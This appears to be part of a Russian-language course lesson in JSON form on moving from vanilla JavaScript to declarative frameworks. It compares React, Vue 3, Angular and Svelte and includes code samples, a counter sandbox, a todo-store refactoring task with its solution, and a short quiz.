            "code": "// Компонент — чистая функция от состояния: одни и те же данные\n// всегда дают одну и ту же разметку.\nfunction OrderStatus({ state }) {\n  if (state.status === 'loading') return <Spinner />;\n  if (state.status === 'error')   return <Error text={state.message} />;\n  return <OrderList orders={state.orders} />;\n}\n\n// Разработчик не пишет переходов между состояниями — он описывает,\n// как выглядит интерфейс В КАЖДОМ из них:\nOrderStatus({ state: { status: 'loading' } });\nOrderStatus({ state: { status: 'error', message: 'Сервис недоступен' } });\nOrderStatus({ state: { status: 'success', orders: [] } });\n\n// Обновление состояния запускает перерисовку автоматически:\nsetState({ status: 'success', orders: data });\n// ...никаких querySelector, innerHTML и ручного скрытия спиннера.",
            "explanation": "Императивный подход требует описать все переходы между состояниями, и их число растёт комбинаторно. Декларативный требует описать сами состояния — их всегда конечное и обозримое количество."
          }
        },
        {
          "title": "Как фреймворки обновляют DOM: Virtual DOM, Proxy и Компиляция",
          "content": "Каждый фреймворк решает задачу эффективного обновления DOM по-своему:\n\n### 1. React: Virtual DOM и Reconciliation (Fiber Tree)\n- При каждом обновлении состояния React создаёт легковесное **виртуальное дерево** (JavaScript-объекты, описывающие структуру UI).\n- Алгоритм **Reconciliation (Diffing)** сравнивает новое виртуальное дерево с предыдущим и вычисляет минимальный набор реальных DOM-операций (патчей).\n- **Fiber Architecture** позволяет прерывать и возобновлять рендеринг, приоритизируя пользовательские взаимодействия.\n\n### 2. Vue 3: Proxy-based Fine-Grained Reactivity\n- Vue 3 оборачивает реактивные объекты в `Proxy` (ES2015 API).\n- При обращении к свойству (`get`) Vue **отслеживает** (track), какой компонент зависит от этого свойства.\n- При изменении свойства (`set`) Vue точечно **триггерит** (trigger) перерисовку только зависимых компонентов, минуя полный обход дерева.\n- Это даёт **мелкозернистую реактивность**: обновляется только тот `<span>`, который реально зависит от изменённых данных.\n\n### 3. Angular: Zone.js → Angular Signals\n- Исторически Angular использовал **Zone.js** — библиотеку, перехватывающую все асинхронные операции (клики, HTTP-запросы, таймеры) и запускающую **Change Detection** — полный обход дерева компонентов.\n- С Angular 16+ появились **Signals** — реактивные примитивы (аналогично Vue `ref()`), позволяющие точечно отслеживать зависимости и обходить Zone.js.\n\n### 4. Svelte / SolidJS: Компиляция реактивности\n- Svelte **не использует Virtual DOM** вообще. Компилятор Svelte анализирует код на этапе сборки и генерирует хирургически точный императивный JavaScript, который напрямую обновляет нужные DOM-узлы.\n- **SolidJS** использует **Signals** (fine-grained reactivity) без Virtual DOM, достигая рекордной производительности.\n\n| Фреймворк | Механизм реактивности | Virtual DOM? | Гранулярность |\n|:---|:---|:---:|:---|\n| React 19 | Virtual DOM + Fiber Reconciliation | ✅ Да | Компонент |\n| Vue 3 | Proxy-based Track/Trigger | ✅ (VNode) | Свойство |\n| Angular 18+ | Zone.js → Signals | ❌ Нет | Компонент / Signal |\n| Svelte 5 | Compile-time Runes ($state) | ❌ Нет | DOM-узел |\n| SolidJS | Runtime Signals | ❌ Нет | DOM-узел |",
          "codeExample": {
            "language": "javascript",
            "title": "Три механизма отслеживания изменений: сравнение деревьев, перехват и компиляция",
            "code": "// ── React: виртуальное дерево + сравнение (Reconciliation) ──\n// Состояние меняется -> строится новое дерево объектов -> сравнение\n// с предыдущим -> в реальный DOM уходит только разница.\nconst prevTree = { type: 'li', props: { children: 'Товар: 990 ₽' } };\nconst nextTree = { type: 'li', props: { children: 'Товар: 1290 ₽' } };\n// Вывод сравнения: поменять текстовый узел, сам <li> не пересоздавать.\n\n// ── Vue 3: перехват объекта (Proxy) ──\nconst state = new Proxy({ price: 990 }, {\n  get(target, key) { track(key);            return target[key]; },\n  set(target, key, value) { target[key] = value; trigger(key); return true; }\n});\n// Чтение регистрирует зависимость, запись оповещает только тех,\n// кто реально читал это поле. Сравнивать дерево не требуется.\n\n// ── Svelte: компиляция ──\n// Исходник:            <p>{price} ₽</p>\n// Компилятор выпускает прямую операцию, без всякого рантайма:\n//   if (changed.price) p_text.data = ctx.price + ' ₽';",
            "explanation": "Три подхода отличаются моментом, когда вычисляется зависимость между данными и разметкой: во время работы через сравнение деревьев, во время работы через перехват обращений или заранее, на этапе сборки."
          }
        },
        {
          "title": "Сравнительная матрица: React vs Vue 3 vs Angular vs Svelte",
          "content": "Выбор фреймворка — это не вопрос «лучший / худший», а вопрос контекста: команда, экосистема, масштаб проекта и карьерная стратегия.\n\n### ⚛️ React (Meta)\n- **Философия**: минималистичная UI-библиотека. Всё остальное (роутинг, state, формы) — отдельные пакеты на выбор разработчика.\n- **Синтаксис**: JSX/TSX — JavaScript-выражения прямо внутри разметки: `<h1>{user.name}</h1>`.\n- **Экосистема**: крупнейшая в мире — Next.js (SSR/SSG), React Native (мобилки), Zustand, TanStack Query, Radix UI.\n- **Рынок труда**: #1 по количеству вакансий в мире и в СНГ.\n\n### 🟢 Vue 3 (Evan You)\n- **Философия**: «прогрессивный фреймворк» — можно начать с CDN-скрипта и масштабировать до SPA с Nuxt и Pinia.\n- **Синтаксис**: Single File Components (`.vue`) — `<template>`, `<script setup>`, `<style scoped>` в одном файле.\n- **Composition API**: `ref()`, `computed()`, `watch()` — композируемые функции, аналогичные React Hooks.\n- **Рынок**: популярен в Китае, Европе, активно растёт в СНГ.\n\n### 🔺 Angular (Google)\n- **Философия**: «batteries included» — роутинг, HTTP-клиент, формы, анимации, DI, RxJS встроены из коробки.\n- **Синтаксис**: TypeScript-first, декораторы (`@Component`, `@Injectable`), Dependency Injection.\n- **Кривая обучения**: самая крутая — требует знания TypeScript, RxJS, Decorators, Module System.\n- **Рынок**: Enterprise, банки, крупные корпорации (Google, SAP, Deutsche Bank).\n\n### 🔥 Svelte 5 (Rich Harris)\n- **Философия**: «исчезающий фреймворк» — весь код компилируется в оптимальный vanilla JS.\n- **Синтаксис**: `.svelte` файлы — почти чистый HTML с `{выражениями}` и `$state` runes.\n- **Размер бандла**: минимальный среди всех фреймворков.\n- **Рынок**: быстро растёт, но экосистема пока меньше.",
          "image": {
            "src": "/images/lessons/framework-react-vue-angular-comparison.svg",
            "alt": "Сравнительная таблица React, Vue 3, Angular и Svelte",
            "caption": "Схема 2: Детальное сравнение четырёх основных фреймворков по 6 критериям"
          }
        },
        {
          "title": "Компонентное мышление: Props, State, Lifecycle и однонаправленный поток данных",
          "content": "Переход к фреймворкам — это прежде всего переход к **компонентному мышлению**. Вместо одного монолитного JS-файла вы декомпозируете интерфейс на изолированные, переиспользуемые блоки — **компоненты**.\n\n### Анатомия компонента (общие концепции):\n\n1. **Props (Свойства)**: входные данные, передаваемые от родительского компонента. Props **только для чтения** (read-only).\n   - React: `function Card({ title, price }) { ... }`\n   - Vue: `defineProps<{ title: string; price: number }>()`\n\n2. **State (Состояние)**: внутренние данные компонента, при изменении которых UI перерисовывается.\n   - React: `const [count, setCount] = useState(0)`\n   - Vue: `const count = ref(0)`\n\n3. **Lifecycle (Жизненный цикл)**: этапы существования компонента — монтирование, обновление, размонтирование.\n   - React: `useEffect(() => { ... return () => cleanup() }, [deps])`\n   - Vue: `onMounted(() => { ... })`, `onUnmounted(() => { ... })`\n\n4. **Однонаправленный поток данных (One-Way Data Flow)**:\n   - Данные всегда передаются **сверху вниз** (от родителя к ребёнку через Props).\n   - Ребёнок **не может** напрямую изменить Props родителя.\n   - Для обратной коммуникации ребёнок вызывает **callback** (React) или **emit** (Vue), переданный родителем.\n\n### Иммутабельность (Immutability):\n- В React **НЕЛЬЗЯ** напрямую мутировать состояние: `state.items.push(item)` — ❌ НЕ вызовет перерисовку.\n- Правильно: `setItems(prev => [...prev, item])` — создаётся **новый массив**, и React обнаруживает изменение по ссылке.\n- В Vue 3 мутации допустимы благодаря Proxy: `items.value.push(item)` — ✅ Vue отследит изменение автоматически.",
          "codeExample": {
            "language": "javascript",
            "title": "ОДИН И ТОТ ЖЕ СЧЁТЧИК: VANILLA JS vs REACT vs VUE 3",
            "code": "// ========= VANILLA JS (Императивный) =========\nlet count = 0;\nconst btn = document.getElementById('btn');\nconst display = document.getElementById('count');\nbtn.addEventListener('click', () => {\n  count++;\n  display.textContent = count; // Ручное обновление DOM\n});\n\n// ========= REACT (Декларативный — JSX) =========\n// function Counter() {\n//   const [count, setCount] = useState(0);\n//   return (\n//     <div>\n//       <span>{count}</span>\n//       <button onClick={() => setCount(c => c + 1)}>+</button>\n//     </div>\n//   );\n// }\n\n// ========= VUE 3 (Декларативный — SFC) =========\n// <script setup>\n// import { ref } from 'vue';\n// const count = ref(0);\n// </script>\n// <template>\n//   <span>{{ count }}</span>\n//   <button @click=\"count++\">+</button>\n// </template>"
          }
        },
        {
          "title": "Практический роадмап: как начать и что учить после Vanilla JS",
          "content": "После прохождения модулей JavaScript Master и Web Development Pro вы готовы к изучению любого фреймворка. Вот рекомендуемый план:\n\n### Шаг 1: Выберите первый фреймворк (рекомендация: React)\n- **React** — оптимальный выбор для первого фреймворка благодаря крупнейшей экосистеме, количеству вакансий и обучающих материалов.\n- Альтернативно: **Vue 3**, если хотите более плавный переход от Vanilla JS (ближе к обычному HTML).\n\n### Шаг 2: Освойте базовый стек\n- **React**: JSX → Hooks (useState, useEffect) → Props → React Router → Fetch/TanStack Query.\n- **Vue**: SFC → Composition API (ref, computed) → Vue Router → Pinia → Axios.\n\n### Шаг 3: Добавьте TypeScript\n- TypeScript — обязательный навык в современной разработке. Изучите его параллельно с фреймворком: Generic Props, Interface для State, строгая типизация API-ответов.\n\n### Шаг 4: SSR-фреймворк (мета-фреймворк)\n- **Next.js** (для React) или **Nuxt** (для Vue) — для server-side rendering, static generation и полноценных full-stack приложений.\n\n### Шаг 5: Расширяйте горизонты\n- Попробуйте Svelte / SolidJS — они дадут глубокое понимание реактивности.\n- Изучите Angular, если планируете работать в Enterprise / банковском секторе.\n\n### Важно помнить:\n- **Vanilla JS — это фундамент, а не устаревшая технология!** Глубокое понимание DOM, Event Loop, замыканий и прототипов делает вас сильнее в любом фреймворке.\n- **Фреймворки приходят и уходят, а JavaScript остаётся.** Разработчик, понимающий основы языка, освоит любой новый фреймворк за 2-3 недели.",
          "codeExample": {
            "language": "bash",
            "title": "Первые шаги: с чего начать практику после Vanilla JS",
            "code": "# 1. Создаём проект на Vite: минимум конфигурации, мгновенный старт\nnpm create vite@latest my-first-react -- --template react-ts\ncd my-first-react && npm install && npm run dev\n\n# 2. Три учебных проекта, закрывающих базовые паттерны:\n#    todo-list      — состояние, списки, ключи, иммутабельные обновления\n#    weather-widget — загрузка данных, состояния загрузки и ошибки\n#    chat-ui        — формы, эффекты, прокрутка к последнему сообщению\n\n# 3. Дальше добавляем инструменты по мере реальной необходимости:\nnpm i react-router-dom       # маршрутизация между экранами\nnpm i @tanstack/react-query  # серверное состояние: кэш и повторы\nnpm i zustand                # клиентское глобальное состояние\n\n# 4. Мета-фреймворк — только когда нужен рендеринг на сервере:\nnpm create next-app@latest",
            "explanation": "Не стоит начинать с крупного проекта и подключать хранилище состояния с первого дня. Сначала локальное состояние и три маленьких приложения, затем маршрутизация, работа с сервером и лишь потом мета-фреймворк."
          }
        }
      ],
      "commonMistakes": [
        {
          "bad": "state.items.push(newItem);\n// React: Компонент НЕ перерисуется!",
          "good": "setItems(prev => [...prev, newItem]);\n// React: Новая ссылка → перерисовка!",
          "reason": "В React состояние (State) должно обновляться иммутабельно — через создание нового объекта/массива. Прямая мутация не изменяет ссылку и React не обнаруживает изменение."
        },
        {
          "bad": "// Логика, стили и разметка в разных файлах\n// logic.js + template.html + styles.css\n// Нужно держать 3 файла синхронно",
          "good": "// Компонент = единый модуль:\n// React: Card.tsx (JSX + логика + CSS-in-JS)\n// Vue: Card.vue (template + script + style scoped)",
          "reason": "Компонентный подход объединяет связанные разметку, логику и стили в один файл (Single File Component). Это повышает читаемость и упрощает переиспользование."
        },
        {
          "bad": "// Прямые DOM-манипуляции внутри React-компонента\ndocument.getElementById('title').textContent = name;\ndocument.querySelector('.list').innerHTML = html;",
          "good": "// Декларативный подход через JSX\nreturn (\n  <h1>{name}</h1>\n  <ul>{items.map(i => <li key={i.id}>{i.text}</li>)}</ul>\n);",
          "reason": "Внутри компонентов React/Vue НЕЛЬЗЯ напрямую обращаться к DOM. Фреймворк управляет DOM сам. Используйте ref() / useRef() только для исключительных случаев (фокус, измерение размеров)."
        }
      ],
      "seniorTips": [
        "Не начинайте изучение React/Vue с мега-проекта. Постройте 3 маленьких приложения: Todo, Weather Widget и простой чат — это закрепит основные паттерны.",
        "Поймите разницу между Controlled и Uncontrolled компонентами (особенно для форм). В React предпочитайте Controlled: значение поля хранится в State, а не в DOM.",
        "Используйте DevTools фреймворка: React DevTools, Vue DevTools — они показывают дерево компонентов, Props, State и позволяют отлаживать перерисовки.",
        "Не оборачивайте всё в глобальный State Manager (Redux/Pinia) с первого дня. Начните с локального useState/ref и поднимайте состояние (Lifting State Up) только когда несколько компонентов нуждаются в одних данных.",
        "Изучите паттерн 'Container / Presentational' (Smart / Dumb components): контейнеры загружают данные и управляют логикой, а презентационные компоненты только отображают Props."
      ],
      "keyTakeaways": [
        "Фреймворки решают фундаментальную проблему Vanilla JS — рассинхронизацию состояния (данных) и DOM (интерфейса) при масштабировании приложения.",
        "Единая формула всех фреймворков: UI = f(State) — интерфейс является чистой функцией от текущего состояния, а DOM обновляется автоматически.",
        "React использует Virtual DOM и Fiber Reconciliation, Vue 3 — Proxy-based реактивность, Angular — Signals, Svelte — компиляцию в чистый JS без Virtual DOM.",
        "Компонентное мышление (Props, State, Lifecycle, однонаправленный поток данных) — это универсальный навык, переносимый между любыми фреймворками.",
        "Vanilla JavaScript — не устаревшая технология, а фундамент. Глубокое понимание JS делает вас сильнее в любом фреймворке и ускоряет освоение новых инструментов."
      ]
    },
    "sandbox": {
      "instructions": "Интерактивное сравнение: реализация одного и того же счётчика (Counter) на Vanilla JS и на декларативном подходе (эмуляция React-подхода). Измените состояние и наблюдайте, как UI обновляется автоматически без ручных DOM-манипуляций!",
      "initialHtml": "<div class=\"demo-container\">\n  <h2>Vanilla JS vs Декларативный подход</h2>\n  <p class=\"subtitle\">Сравните два способа обновления интерфейса</p>\n\n  <div class=\"panels\">\n    <!-- Imperative Panel -->\n    <div class=\"panel panel-imperative\">\n      <div class=\"panel-header imperative-header\">\n        <span class=\"dot red\"></span>\n        <span class=\"dot yellow\"></span>\n        <span class=\"dot green\"></span>\n        <span class=\"panel-title\">❌ Vanilla JS (Императивный)</span>\n      </div>\n      <div class=\"panel-body\">\n        <div class=\"counter-display\">\n          <span class=\"counter-label\">Счётчик:</span>\n          <span id=\"imp-count\" class=\"counter-value\">0</span>\n        </div>\n        <div class=\"btn-row\">\n          <button id=\"imp-dec\" class=\"btn btn-dec\">−</button>\n          <button id=\"imp-reset\" class=\"btn btn-reset\">Reset</button>\n          <button id=\"imp-inc\" class=\"btn btn-inc\">+</button>\n        </div>\n        <div class=\"dom-ops\">\n          <span class=\"dom-ops-label\">DOM-операций:</span>\n          <span id=\"imp-ops\" class=\"dom-ops-count\">0</span>\n        </div>\n        <pre id=\"imp-log\" class=\"log-box\"></pre>\n      </div>\n    </div>\n\n    <!-- Declarative Panel -->\n    <div class=\"panel panel-declarative\">\n      <div class=\"panel-header declarative-header\">\n        <span class=\"dot red\"></span>\n        <span class=\"dot yellow\"></span>\n        <span class=\"dot green\"></span>\n        <span class=\"panel-title\">✅ Декларативный (React-подход)</span>\n      </div>\n      <div class=\"panel-body\">\n        <div class=\"counter-display\">\n          <span class=\"counter-label\">Счётчик:</span>\n          <span id=\"dec-count\" class=\"counter-value\">0</span>\n        </div>\n        <div class=\"btn-row\">\n          <button id=\"dec-dec\" class=\"btn btn-dec\">−</button>\n          <button id=\"dec-reset\" class=\"btn btn-reset\">Reset</button>\n          <button id=\"dec-inc\" class=\"btn btn-inc\">+</button>\n        </div>\n        <div class=\"dom-ops\">\n          <span class=\"dom-ops-label\">Авто-рендеров:</span>\n          <span id=\"dec-ops\" class=\"dom-ops-count\">0</span>\n        </div>\n        <pre id=\"dec-log\" class=\"log-box\"></pre>\n      </div>\n    </div>\n  </div>\n\n  <div class=\"comparison-note\">\n    <strong>💡 Ключевое отличие:</strong> Слева — каждое обновление DOM выполняется вручную (querySelector + textContent). Справа — UI автоматически пересчитывается из State (как в React/Vue).\n  </div>\n</div>",
      "initialCss": "* { box-sizing: border-box; margin: 0; }\nbody { background: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding: 16px; }\n.demo-container { max-width: 780px; margin: 0 auto; }\nh2 { color: #58a6ff; font-size: 18px; margin-bottom: 4px; }\n.subtitle { color: #8b949e; font-size: 13px; margin-bottom: 18px; }\n.panels { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }\n.panel { background: #161b22; border-radius: 10px; overflow: hidden; border: 1px solid #30363d; }\n.panel-header { display: flex; align-items: center; gap: 6px; padding: 10px 14px; }\n.imperative-header { background: rgba(248, 81, 73, 0.1); border-bottom: 1px solid rgba(248, 81, 73, 0.2); }\n.declarative-header { background: rgba(63, 185, 80, 0.1); border-bottom: 1px solid rgba(63, 185, 80, 0.2); }\n.dot { width: 10px; height: 10px; border-radius: 50%; }\n.dot.red { background: #f85149; }\n.dot.yellow { background: #d29922; }\n.dot.green { background: #3fb950; }\n.panel-title { font-size: 12px; font-weight: 700; color: #e6edf3; margin-left: 6px; }\n.panel-body { padding: 16px; }\n.counter-display { display: flex; align-items: center; gap: 10px; margin-bottom: 14px; }\n.counter-label { color: #8b949e; font-size: 13px; }\n.counter-value { font-size: 36px; font-weight: 800; font-family: monospace; color: #f0f6fc; min-width: 60px; text-align: center; background: #0d1117; padding: 6px 14px; border-radius: 8px; border: 1px solid #30363d; }\n.btn-row { display: flex; gap: 8px; margin-bottom: 14px; }\n.btn { flex: 1; padding: 10px; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.15s; }\n.btn-inc { background: #238636; color: #fff; }\n.btn-inc:hover { background: #2ea043; }\n.btn-dec { background: #da3633; color: #fff; }\n.btn-dec:hover { background: #f85149; }\n.btn-reset { background: #30363d; color: #c9d1d9; }\n.btn-reset:hover { background: #484f58; }\n.dom-ops { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }\n.dom-ops-label { color: #8b949e; font-size: 12px; }\n.dom-ops-count { color: #f0883e; font-weight: bold; font-family: monospace; font-size: 14px; }\n.log-box { background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 8px 10px; font-family: monospace; font-size: 10.5px; line-height: 1.5; color: #7ee787; height: 100px; overflow-y: auto; white-space: pre-wrap; }\n.comparison-note { background: rgba(88, 166, 255, 0.08); border: 1px solid rgba(88, 166, 255, 0.2); border-radius: 8px; padding: 12px 16px; font-size: 12.5px; line-height: 1.5; color: #c9d1d9; }\n.comparison-note strong { color: #58a6ff; }",
      "initialJs": "// ==============================\n// ЛЕВАЯ ПАНЕЛЬ: Vanilla JS (Императивный)\n// ==============================\nlet impCount = 0;\nlet impOps = 0;\nconst impCountEl = document.getElementById('imp-count');\nconst impOpsEl = document.getElementById('imp-ops');\nconst impLog = document.getElementById('imp-log');\n\nfunction impLogMsg(msg) {\n  impLog.textContent = msg + '\\n' + impLog.textContent;\n}\n\ndocument.getElementById('imp-inc').addEventListener('click', () => {\n  impCount++;\n  // Шаг 1: Вручную найти элемент и обновить текст\n  impCountEl.textContent = impCount;\n  impOps++;\n  impOpsEl.textContent = impOps;\n  impLogMsg(`[DOM] querySelector('.counter') → textContent = ${impCount}`);\n});\n\ndocument.getElementById('imp-dec').addEventListener('click', () => {\n  impCount--;\n  impCountEl.textContent = impCount;\n  impOps++;\n  impOpsEl.textContent = impOps;\n  impLogMsg(`[DOM] querySelector('.counter') → textContent = ${impCount}`);\n});\n\ndocument.getElementById('imp-reset').addEventListener('click', () => {\n  impCount = 0;\n  impCountEl.textContent = impCount;\n  impOps++;\n  impOpsEl.textContent = impOps;\n  impLogMsg(`[DOM] reset → textContent = 0`);\n});\n\n// ==============================\n// ПРАВАЯ ПАНЕЛЬ: Декларативный (React-подход)\n// ==============================\n// Эмуляция реактивного State → автоматический UI рендер\nlet decRenders = 0;\nconst decCountEl = document.getElementById('dec-count');\nconst decOpsEl = document.getElementById('dec-ops');\nconst decLog = document.getElementById('dec-log');\n\nfunction decLogMsg(msg) {\n  decLog.textContent = msg + '\\n' + decLog.textContent;\n}\n\n// Мини-реактивная система: State → автоматический render()\nfunction createReactiveState(initial) {\n  let _state = initial;\n  return {\n    get value() { return _state; },\n    set value(newVal) {\n      const oldVal = _state;\n      _state = newVal;\n      // Автоматический рендер при изменении (как React setState)\n      render(oldVal, newVal);\n    }\n  };\n}\n\nconst count = createReactiveState(0);\n\n// Функция render() — аналог React reconciliation\nfunction render(oldVal, newVal) {\n  decRenders++;\n  // UI = f(State): Описываем ЧТО показать\n  decCountEl.textContent = newVal;\n  decOpsEl.textContent = decRenders;\n  decLogMsg(`[Auto-Render #${decRenders}] State: ${oldVal} → ${newVal}`);\n}\n\n// Обработчики: только меняют State, НЕ трогают DOM!\ndocument.getElementById('dec-inc').addEventListener('click', () => {\n  count.value = count.value + 1; // Просто обновляем state\n});\n\ndocument.getElementById('dec-dec').addEventListener('click', () => {\n  count.value = count.value - 1;\n});\n\ndocument.getElementById('dec-reset').addEventListener('click', () => {\n  count.value = 0;\n});"
    },
    "task": {
      "title": "Рефакторинг Vanilla JS-компонента в декларативную реактивную архитектуру",
      "scenario": "У вас есть императивный Vanilla JS код для списка задач (Todo List): прямые querySelector, createElement, appendChild и глобальные переменные. Ваша задача — отрефакторить его в мини-реактивную систему с State → автоматическим рендерингом, имитирующую подход React/Vue.",
      "criteria": [
        "Создать функцию createStore(initialState) с методами getState(), setState(updater) и subscribe(listener)",
        "Все данные задач хранятся в едином State объекте: { todos: [...], filter: 'all' }",
        "При вызове setState() автоматически вызывается функция render() для перерисовки UI",
        "Функция render() полностью заменяет содержимое контейнера на основе текущего State (декларативно)",
        "Обработчики событий только вызывают setState(), НЕ обращаются к DOM напрямую"
      ],
      "starterCode": {
        "js": "// Императивный Vanilla JS (нужно отрефакторить):\nlet todos = [];\nlet nextId = 1;\n\nfunction addTodo(text) {\n  const todo = { id: nextId++, text, done: false };\n  todos.push(todo);\n  // Прямая DOM-манипуляция\n  const li = document.createElement('li');\n  li.textContent = todo.text;\n  li.id = 'todo-' + todo.id;\n  document.getElementById('list').appendChild(li);\n}\n\nfunction toggleTodo(id) {\n  const todo = todos.find(t => t.id === id);\n  todo.done = !todo.done;\n  // Прямая DOM-манипуляция\n  const li = document.getElementById('todo-' + id);\n  li.style.textDecoration = todo.done ? 'line-through' : 'none';\n}\n\n// ЗАДАНИЕ: Перепишите используя createStore() и render()\n// function createStore(initialState) { ... }\n// function render(state, container) { ... }"
      },
      "hints": [
        "createStore должен хранить state, массив listeners и вызывать forEach(fn => fn(state)) при каждом setState.",
        "setState принимает функцию-апдейтер: setState(prev => ({ ...prev, todos: [...prev.todos, newTodo] })) — аналогично React.",
        "Функция render должна очищать контейнер (innerHTML = '') и строить весь UI заново из текущего state. Это неоптимально для больших списков, но именно так концептуально работает Virtual DOM."
      ],
      "solution": {
        "js": "// Мини-реактивный Store (аналог Redux / Zustand)\nfunction createStore(initialState) {\n  let state = initialState;\n  const listeners = [];\n  return {\n    getState: () => state,\n    setState: (updater) => {\n      state = typeof updater === 'function' ? updater(state) : updater;\n      listeners.forEach(fn => fn(state));\n    },\n    subscribe: (fn) => { listeners.push(fn); return () => listeners.splice(listeners.indexOf(fn), 1); }\n  };\n}\n\n// Инициализация Store\nconst store = createStore({ todos: [], nextId: 1, filter: 'all' });\n\n// Декларативная функция render: UI = f(State)\nfunction render(state) {\n  const container = document.getElementById('app');\n  const filtered = state.filter === 'all' ? state.todos\n    : state.filter === 'done' ? state.todos.filter(t => t.done)\n    : state.todos.filter(t => !t.done);\n\n  container.innerHTML = `\n    <input id=\"input\" placeholder=\"Новая задача...\" />\n    <button id=\"add-btn\">Добавить</button>\n    <div>\n      <button class=\"filter\" data-f=\"all\">Все</button>\n      <button class=\"filter\" data-f=\"active\">Активные</button>\n      <button class=\"filter\" data-f=\"done\">Готовые</button>\n    </div>\n    <ul>${filtered.map(t => `\n      <li style=\"text-decoration: ${t.done ? 'line-through' : 'none'}\">\n        <input type=\"checkbox\" data-id=\"${t.id}\" ${t.done ? 'checked' : ''} />\n        ${t.text}\n      </li>`).join('')}</ul>\n    <p>Всего: ${state.todos.length} | Готово: ${state.todos.filter(t => t.done).length}</p>\n  `;\n\n  // Привязка событий после рендера\n  document.getElementById('add-btn').onclick = () => {\n    const text = document.getElementById('input').value.trim();\n    if (!text) return;\n    store.setState(s => ({\n      ...s,\n      todos: [...s.todos, { id: s.nextId, text, done: false }],\n      nextId: s.nextId + 1\n    }));\n  };\n  container.querySelectorAll('.filter').forEach(btn => {\n    btn.onclick = () => store.setState(s => ({ ...s, filter: btn.dataset.f }));\n  });\n  container.querySelectorAll('[data-id]').forEach(cb => {\n    cb.onchange = () => {\n      const id = Number(cb.dataset.id);\n      store.setState(s => ({\n        ...s,\n        todos: s.todos.map(t => t.id === id ? { ...t, done: !t.done } : t)\n      }));\n    };\n  });\n}\n\n// Подписка: автоматический рендер при ЛЮБОМ изменении State\nstore.subscribe(render);\nrender(store.getState()); // Первый рендер",
        "explanation": "Мы создали мини-реактивную систему, повторяющую паттерн Redux/Zustand: единый Store хранит всё состояние, setState() принимает иммутабельный updater, а subscribe() автоматически вызывает функцию render() при каждом изменении. Функция render() декларативно строит весь UI из текущего состояния — точно так же, как это концептуально делает React с Virtual DOM."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro-23-q1",
          "question": "Что означает формула «интерфейс есть функция от состояния»?",
          "options": [
            "Состояние вычисляется из текущего содержимого документа при каждой отрисовке",
            "Каждый компонент обязан быть чистой функцией и не иметь собственного состояния",
            "Разработчик описывает, как выглядит интерфейс при данном состоянии, а не шаги его изменения",
            "Интерфейс полностью пересоздаётся заново при любом изменении состояния приложения"
          ],
          "correctIndex": 2,
          "explanation": "В императивном подходе вы вручную описываете переходы: найти узел, поменять текст, добавить класс, удалить строку — и число возможных сочетаний состояний растёт быстрее, чем вы успеваете их обрабатывать. Декларативный подход переворачивает задачу: вы описываете результат для каждого состояния, а поиск минимального набора изменений берёт на себя фреймворк. Полностью дерево при этом не пересоздаётся."
        },
        {
          "id": "pro-23-q2",
          "question": "Какие механизмы обновления интерфейса используют React, Vue 3 и Svelte соответственно?",
          "options": [
            "Все три используют виртуальное дерево и различаются лишь алгоритмом сравнения",
            "Компиляция в точечные операции, виртуальное дерево, перехват объекта",
            "Перехват объекта, компиляция в точечные операции, виртуальное дерево",
            "Виртуальное дерево, перехват объекта, компиляция в точечные операции"
          ],
          "correctIndex": 3,
          "explanation": "Первый строит облегчённое дерево в памяти и сравнивает его с предыдущим, обновляя только различия. Второй оборачивает состояние перехватчиком и точно знает, какие компоненты зависят от изменившегося поля. Третий переносит работу на этап сборки: компилятор заранее выясняет, какие узлы зависят от каких переменных, и выпускает прямые команды обновления без всякого сравнения во время работы."
        },
        {
          "id": "pro-23-q3",
          "question": "Почему интерфейс не обновится после выполнения этих строк?",
          "codeSnippet": "const [items, setItems] = useState([]);\nitems.push(newItem); // (1)\nsetItems(items);     // (2)",
          "options": [
            "Обновление состояния асинхронно, поэтому нужно передавать функцию вместо значения",
            "Функцию обновления состояния нельзя вызывать вне обработчика события",
            "Метод добавления недоступен для массивов, хранящихся в состоянии компонента",
            "Ссылка на массив не изменилась, и сравнение не обнаружило никаких изменений"
          ],
          "correctIndex": 3,
          "explanation": "Изменение массива на месте не создаёт новый объект: переменная по-прежнему указывает на ту же область памяти. Сравнение с предыдущим значением по ссылке даёт равенство, и перерисовка не запускается. Работать с состоянием нужно неизменяемо: `setItems([...items, newItem])` создаёт новый массив с новой ссылкой. То же правило действует для объектов и вложенных структур."
        },
        {
          "id": "pro-23-q4",
          "question": "Чем подход Svelte принципиально отличается от React и Vue?",
          "options": [
            "Он обновляет документ напрямую императивными командами, которые пишет сам разработчик",
            "Он выполняет отрисовку на сервере, отдавая браузеру только готовую разметку страницы",
            "Он использует перехват объектов вместо виртуального дерева при отслеживании изменений",
            "Он переносит работу по обновлению интерфейса на этап сборки, отказавшись от сравнения деревьев"
          ],
          "correctIndex": 3,
          "explanation": "Здесь фреймворк — не библиотека, которая едет в браузер, а компилятор. Он разбирает компонент на этапе сборки, выясняет зависимости между переменными и разметкой и выпускает обычный JavaScript, точечно обновляющий нужные узлы. В браузер не попадает ни механизм сравнения деревьев, ни система отслеживания зависимостей — отсюда очень маленький объём итогового кода."
        },
        {
          "id": "pro-23-q5",
          "question": "Что означает однонаправленный поток данных в компонентной архитектуре?",
          "options": [
            "Состояние приложения хранится исключительно в его корневом компоненте",
            "Данные передаются только от сервера к клиенту, обратный обмен при этом невозможен",
            "Дочерний компонент вправе напрямую изменять переданные ему родителем свойства",
            "Данные идут сверху вниз через свойства, а обратная связь поднимается через обработчики"
          ],
          "correctIndex": 3,
          "explanation": "Родитель владеет данными и передаёт их вниз только для чтения, а ребёнок сообщает о произошедшем, вызывая переданную функцию. Благодаря этому у каждого куска состояния есть ровно один хозяин, и при отладке всегда понятно, откуда взялось значение и кто мог его изменить. Если бы дочерние компоненты меняли свойства напрямую, источник изменения пришлось бы искать по всему дереву."
        }
      ]
    }
  }
];
